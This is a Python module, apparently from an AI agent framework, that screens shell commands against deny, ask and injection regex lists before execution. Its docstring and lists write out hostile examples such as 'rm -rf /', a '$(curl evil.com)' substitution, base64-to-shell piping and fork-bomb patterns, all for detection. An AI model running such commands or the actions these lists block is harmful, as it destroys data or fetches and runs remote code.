"""
Phase 2: SafetyCheckHook — 命令执行前的安全检查拦截器。

SafetyCheckHook 是 Agent 安全体系的第一道防线（应用层）。
它在每个工具的 on_pre_execute 阶段执行，对所有 shell 命令进行
黑名单匹配 + 风险分级 + 审批决定。

安全模型（三层）：
  Layer 1: SafetyCheckHook（应用层）    → 快速阻断已知危险模式
  Layer 2: Docker Sandbox（系统层）      → 剥夺危险能力（无网络/只读根/非root）
  Layer 3: HITL 审批（流程层, Phase 9） → 用户最终裁决

为什么 Hook 检查 + Docker 沙箱是互补的？
  - Hook 能精准识别"rm -rf /"这种明确危险命令，在进入 Docker 之前就拒掉
  - Docker 能兜底 Hook 无法识别的危险（pip 恶意包、fork 炸弹、OOM），
    通过只读根文件系统、无网络、CPU/内存限制来硬约束
  - 两者叠加 = 深度防御（Defense in Depth）

命令安全分级：
  DENY   — 直接拒绝（无任何合理使用场景的危险操作）
           如: rm -rf /, sudo, mkfs, dd if= of=/dev/sda, chmod 777 /
  ASK    — 需要确认（有合理使用场景但可能危险的操作）
           如: rm (删除文件), curl/wget (网络请求), pip install (包安装)
           Phase 2: 打印黄色警告 + 放行
           Phase 9: 接入 HITL 弹窗确认
  ALLOW  — 默认放行（安全或必要的日常操作）
           如: ls, echo, cat, cd, python --version, pytest, pip list

防绕过检测（Shell Injection Detection）：
  以下模式会被额外审查（即使不在黑名单中也会标记为高风险）:
  - 管道符 + 危险命令: echo "ok" && rm -rf /
  - 命令替换 + 危险命令: $(curl evil.com)
  - base64 编码执行: echo "..." | base64 -d | sh
  - python -c 内嵌危险操作: python -c "import os; os.system('rm -rf /')"
  - 反引号命令替换: `curl evil.com`

使用方式：
  from app.tools.safety_hook import SafetyCheckHook, tool_safety

  # 在 register_all_tools() 中注册（在 ToolStatsCollector 之前）
  tool_registry.register_hook(tool_safety)
"""

# ── Python 标准库 ──
import re                              # 正则匹配危险命令模式
from app.tools.hooks import ToolHook   # Hook 协议基类


# ═══════════════════════════════════════════════════════════════════════════════
# 危险命令模式库
# ═══════════════════════════════════════════════════════════════════════════════

# ── DENY 级别: 直接拒绝（无合理用途的恶意操作） ─────────────────

DENY_PATTERNS: list[tuple[str, str]] = [
    # (正则模式, 拒绝理由)

    # 裸递归删除根目录
    (r'\brm\s+-rf\s+(/\*?|~|/home\b|/root\b|/etc\b|/var\b|/usr\b|/boot\b)',
     "Recursively deleting critical system directories"),

    # sudo 提权
    (r'\bsudo\b', "Attempting to escalate privileges with sudo"),

    # 文件系统格式化
    (r'\bmkfs\.\w+|mkfs\s+\S+', "Filesystem formatting (mkfs)"),
    (r'\bdd\s+if=', "Raw disk write (dd) — can overwrite partitions"),

    # 写入关键设备
    (r'>\s*/dev/sd[a-z]\d?\b', "Redirecting output to raw disk device"),
    (r'>\s*/dev/null\b', ""),  # 这个是安全的，跳过
    (r'>\s*/dev/(?!null\b)\w+', "Redirecting output to system device"),

    # 修改关键系统文件权限
    (r'\bchmod\s+(-R\s+)?777\s+/(\S*/)?\w*',
     "Setting world-writable permissions on system paths"),
    (r'\bchmod\s+.*\s/(etc|bin|sbin|usr|var|boot|root)\b',
     "Modifying permissions of critical system directories"),

    # 删除系统级 cron 任务
    (r'\bcrontab\s+-r\b', "Removing all crontab entries"),
    (r'>\s*/etc/cron', "Writing to system crontab"),

    # 系统级服务操作（禁用安全服务）
    (r'\bsystemctl\s+(stop|disable|mask)\s+(sshd|iptables|ufw|firewalld|selinux)\b',
     "Disabling security-critical system services"),

    # Git 危险操作（强制推送到 main/master）
    (r'\bgit\s+push\s+(-f|--force)\s+origin\s+(main|master)\b',
     "Force-pushing to main/master branch"),

    # fork 炸弹模式
    (r':\(\)\s*\{', "Fork bomb pattern detected"),
    (r'\(\)\s*\{.*:\|:.*&\s*\}\s*;', "Fork bomb pattern detected"),

    # 内核模块操作
    (r'\b(modprobe|insmod|rmmod)\b', "Loading/unloading kernel modules"),

    # 修改系统时间的危险用法
    (r'\bdate\s+-s\b', "Setting system time"),

    # 滥用 eval / exec 执行任意代码
    (r'\beval\s+\$\{', "Dynamic code execution via eval — likely obfuscation"),
]


# ── ASK 级别: 需要确认（可能有合理用途，但存在风险） ─────────

ASK_PATTERNS: list[tuple[str, str]] = [
    # (正则模式, 风险描述)

    # 文件删除（可能是清理临时文件，也可能删错）
    (r'\brm\s+(-rf?|--recursive|--force)\b', "Recursively deleting files"),

    # 网络请求（可能是下载依赖，也可能是数据泄露）
    (r'\bcurl\b\s+\S+', "Making network request with curl"),
    (r'\bwget\b\s+\S+', "Downloading files with wget"),

    # 管道 + 执行（可能是正常脚本，也可能是恶意注入）
    (r'curl\s+\S+\s*\|', "Piping downloaded content — potential remote code execution"),
    (r'wget\s+\S+\s*-O\s*-\s*\|', "Piping downloaded content — potential remote code execution"),

    # 安装包（可能正常依赖，也可能是恶意包）
    (r'\bpip\s+install\b', "Installing Python packages"),
    (r'\bnpm\s+install\b', "Installing npm packages"),

    # Git 写入操作
    (r'\bgit\s+push\b', "Pushing git commits to remote"),
    (r'\bgit\s+commit\b', "Creating a git commit"),

    # 改变文件权限
    (r'\bchmod\b', "Changing file permissions"),
    (r'\bchown\b', "Changing file ownership"),

    # shell 重定向写入文件
    (r'>\s*\S+\.(sh|bash|zsh|conf|cfg|ini|service|env)\b',
     "Redirecting output to configuration files"),

    # Go/Rust/Cargo 等编译型语言的包安装
    (r'\bgo\s+(install|get)\b', "Installing Go packages"),
    (r'\bcargo\s+install\b', "Installing Rust packages"),

    # 删除环境变量 / 配置文件
    (r'\brm\s+.*\.env\b', "Deleting environment files"),
    (r'\brm\s+.*\.git', "Deleting git-related files"),

    # 执行未知脚本
    (r'\b(bash|sh|zsh|python3?)\s+\S+\.(sh|bash|py)\b',
     "Executing script file — verify script content first"),
]


# ── SHELL INJECTION 检测模式 ─────────────────────────────

SHELL_INJECTION_PATTERNS: list[tuple[str, str]] = [
    # base64 编码后执行（常见绕过技巧）
    (r'base64\s+(-d|--decode).*\|', "base64-encoded content piped to execution"),
    (r'base64\s+(-d|--decode).*\$\(', "base64-encoded content in command substitution"),

    # python -c 执行动态代码
    (r'python3?\s+-c\s+"[^"]*\bimport\s+(os|subprocess|sys|shutil|socket)\b',
     "Python inline execution with dangerous module import"),
    (r'python3?\s+-c\s+.*\b(rm|remove|unlink|mkfs|chmod|chown)\b',
     "Python inline execution with destructive file operations"),

    # 反引号命令替换
    (r'`(curl|wget|rm|sudo|chmod|chown)\b', "Backtick command substitution with dangerous command"),

    # $() 命令替换含危险命令
    (r'\$\((curl|wget|rm\s+-rf|sudo|chmod\s+777)\b',
     "Command substitution with dangerous command"),

    # 编码绕过（hex 编码的命令字符，如 \\x41\\x42...）
    (r"\\x[0-9a-fA-F]{2}\\x[0-9a-fA-F]{2}\\x", "Hex-encoded shell sequence — possible obfuscation"),

    # 管道链中混入危险命令
    # 如: echo "hello" && rm -rf / 或 curl ... | bash
    (r'\|(\s*|\n)*(bash|sh|zsh)\b', "Piping content to shell interpreter"),
    (r'&&\s*(rm\s+-rf|sudo|chmod\s+777|curl|wget)\b',
     "Command chaining with dangerous operation"),

    # dd 磁盘操作
    (r'\bdd\s+.*of=', "Raw disk write with dd"),
    (r'\bdd\s+.*if=/dev/', "Raw disk read with dd"),
]


# ═══════════════════════════════════════════════════════════════════════════════
# SafetyCheckHook
# ═══════════════════════════════════════════════════════════════════════════════

class SafetyCheckHook(ToolHook):
    """
    命令安全检查拦截器 —— Agent 安全体系第一道防线。

    在工具执行前对所有 execute_shell 命令进行安全检查:
      1. DENY_PATTERNS   → 直接拒绝（返回 ToolResult 替代执行）
      2. SHELL_INJECTION  → 检测绕过意图（返回 ToolResult 替代执行）
      3. ASK_PATTERNS    → Phase 2: 打印黄色警告 + 放行
                           Phase 9: 接入 HITL 弹窗确认

    对非 execute_shell 工具:
      不做拦截，直接放行（其他工具的 is_dangerous 由各工具自行声明）

    安全设计原则:
      - 宁可误拦，不可漏放（DENY 模式温和收紧，匹配明确恶意操作）
      - ASK 模式在 Phase 2 只打日志不阻拦（避免阻断开发流程）
      - Shell injection 模式专门检测绕过意图（base64、python -c、管道注入）
    """

    def __init__(self, block_hard: bool = True, log_ask: bool = True):
        """
        Args:
            block_hard: True → DENY 模式直接拒绝执行
                        False → DENY 也只打日志放行（调试模式）
            log_ask:    True → ASK 模式打印黄色警告
        """
        self.block_hard = block_hard       # 是否真正拦截 DENY 命令
        self.log_ask = log_ask             # 是否打印 ASK 警告
        # 统计计数器
        self.denied_count: int = 0         # 被拒绝的命令数
        self.asked_count: int = 0          # 被标记为需要确认的命令数

    # ── Hook 协议实现 ──────────────────────────────────────

    async def on_pre_execute(self, tool_name: str, kwargs: dict) -> dict | None:
        """
        工具执行前安全检查。

        只对 execute_shell 做检查——其他工具的 is_dangerous
        由各工具类的属性自行声明。

        Returns:
            None  → 放行，正常执行
            dict  → 阻止执行，dict 作为 ToolResult(**dict) 返回给 Agent
        """
        if tool_name != "execute_shell":
            return None                  # 非 shell 工具，不干预

        command = kwargs.get("command", "").strip()
        if not command:
            return None                  # 空命令，放行

        # ── 检查 1: DENY 模式（直接拒绝） ─────────────────
        deny_result = self._check_deny(command)
        if deny_result:
            if self.block_hard:
                return deny_result       # 返回 dict，阻止执行
            else:
                print(
                    f"  \033[31m[SAFETY-DENY] {deny_result['error']}\033[0m\n"
                    f"  \033[31m    Command: {command[:100]}\033[0m"
                )
                self.denied_count += 1
                return None              # 调试模式，放行

        # ── 检查 2: Shell Injection 检测（强制拒绝） ─────
        injection_result = self._check_injection(command)
        if injection_result:
            if self.block_hard:
                return injection_result  # 发现绕过意图，直接拒绝
            else:
                print(
                    f"  \033[31m[SAFETY-INJECTION] {injection_result['error']}\033[0m\n"
                    f"  \033[31m    Command: {command[:100]}\033[0m"
                )
                self.denied_count += 1
                return None              # 调试模式，放行

        # ── 检查 3: ASK 模式（需要确认） ──────────────────
        ask_match = self._check_ask(command)
        if ask_match:
            pattern, reason = ask_match
            self.asked_count += 1

            if self.log_ask:
                print(
                    f"  \033[33m[SAFETY-ASK #{self.asked_count}] {reason}\033[0m\n"
                    f"  \033[33m    Command: {command[:120]}\033[0m\n"
                    f"  \033[33m    Matched pattern: {pattern[:60]}\033[0m\n"
                    f"  \033[33m    (Phase 2: auto-allowed. Phase 9: requires user approval.)\033[0m"
                )
            # Phase 2: 放行（Phase 9 改为弹窗确认）
            return None

        # ── 默认：放行 ──
        return None

    # ── 私有：检查方法 ────────────────────────────────────

    def _check_deny(self, command: str) -> dict | None:
        """
        检查命令是否命中 DENY 黑名单。

        DENY = 直接拒绝，无合理使用场景。

        Returns:
            None → 未命中
            dict → {"success": False, "message": ..., "error": ...}
                  注册中心会将此 dict 转为 ToolResult 返回给 Agent
        """
        # 跳过注释行（# 开头）
        if command.strip().startswith("#"):
            return None

        for pattern, reason in DENY_PATTERNS:
            if not pattern or not reason:  # 空 reason = 占位模式（如 /dev/null），跳过
                continue
            try:
                if re.search(pattern, command, re.IGNORECASE):
                    self.denied_count += 1
                    return {
                        "success": False,
                        "message": (
                            f"[BLOCKED] Command rejected by safety check: "
                            f"{reason}.\n"
                            f"Matched pattern: {pattern[:80]}\n"
                            f"Command: {command[:200]}"
                        ),
                        "error": (
                            f"SAFETY_DENY: {reason} "
                            f"(pattern: {pattern[:60]})"
                        ),
                    }
            except re.error:
                continue                 # 正则语法错误 → 跳过此模式

        return None

    def _check_injection(self, command: str) -> dict | None:
        """
        检测命令是否包含 Shell Injection / 绕过意图。

        即使命令本身不在 DENY/ASK 列表中，
        如果使用 base64 解码执行、python -c 内嵌危险调用等模式，
        也作为注入攻击拒绝。

        Returns:
            None → 未命中
            dict → 阻止执行
        """
        if command.strip().startswith("#"):
            return None

        for pattern, reason in SHELL_INJECTION_PATTERNS:
            if not pattern:
                continue
            try:
                if re.search(pattern, command, re.IGNORECASE):
                    self.denied_count += 1
                    return {
                        "success": False,
                        "message": (
                            f"[BLOCKED] Potential shell injection detected: "
                            f"{reason}.\n"
                            f"Command: {command[:200]}\n"
                            f"If this is a legitimate operation, "
                            f"break it into smaller steps."
                        ),
                        "error": (
                            f"SAFETY_INJECTION: {reason} "
                            f"(pattern: {pattern[:60]})"
                        ),
                    }
            except re.error:
                continue

        return None

    def _check_ask(self, command: str) -> tuple[str, str] | None:
        """
        检查命令是否命中 ASK 模式（需要用户确认）。

        ASK = 有合理使用场景，但存在风险，需要用户审批。

        Returns:
            None → 未命中
            (pattern, reason) → 匹配到的模式和原因
        """
        if command.strip().startswith("#"):
            return None

        for pattern, reason in ASK_PATTERNS:
            if not pattern:
                continue
            try:
                if re.search(pattern, command, re.IGNORECASE):
                    return (pattern, reason)
            except re.error:
                continue

        return None

    # ── 公共：统计查询 ────────────────────────────────────

    def get_summary(self) -> dict:
        """
        获取安全检查统计摘要。

        Returns:
            {"denied_count": int, "asked_count": int, "block_hard": bool}
        """
        return {
            "denied_count": self.denied_count,
            "asked_count": self.asked_count,
            "block_hard": self.block_hard,
            "log_ask": self.log_ask,
        }


# ── 全局单例 ──
# 在 register_all_tools() 中注册到 tool_registry
tool_safety = SafetyCheckHook(block_hard=True, log_ask=True)
